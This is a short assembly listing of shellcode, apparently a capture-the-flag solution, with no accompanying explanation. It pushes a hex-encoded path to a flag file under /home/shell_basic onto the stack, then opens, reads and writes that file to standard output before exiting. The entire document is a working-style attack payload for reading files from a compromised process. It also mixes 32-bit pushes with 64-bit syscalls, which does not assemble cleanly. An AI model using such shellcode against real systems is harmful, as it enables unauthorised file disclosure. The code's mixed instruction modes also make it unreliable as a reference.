section .text
global _start
_start:
mov eax, 0x676e6f6f
push eax
mov eax, 0x6f6f6f6f
push eax
mov eax, 0x6c5f7369
push eax
mov eax, 0x5f656d61
push eax
mov eax, 0x6e5f6761
push eax
mov eax, 0x6c662f63
push eax
mov eax, 0x69736162
push eax
mov eax, 0x5f6c6c65
push eax
mov eax, 0x68732f65
push eax
mov eax, 0x6d6f682f
push eax
mov edi, esp
xor esi, esi
xor edx, edx
mov eax, 2
syscall
mov edi, eax
mov esi, esp
sub esi, 0x50
mov edx, 0x50
xor eax, eax
syscall
mov edi, 0x1
mov eax, 0x1
syscall
xor edi, edi
mov eax, 0x3c
syscall
